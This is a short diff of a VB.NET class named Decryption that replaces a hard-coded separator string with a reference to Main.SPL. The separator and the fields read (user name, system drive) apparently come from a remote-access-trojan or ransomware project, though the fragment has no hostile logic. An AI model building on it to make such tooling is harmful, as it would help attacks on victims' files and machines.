@@ -6,7 +6,7 @@ Public Class Decryption
     Private num
     Private userName As String = Environment.UserName
     Private C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3)
-    Public Shared SPL As String = "|'L'|"
+    Public Shared SPL As String = Main.SPL
 
 
 
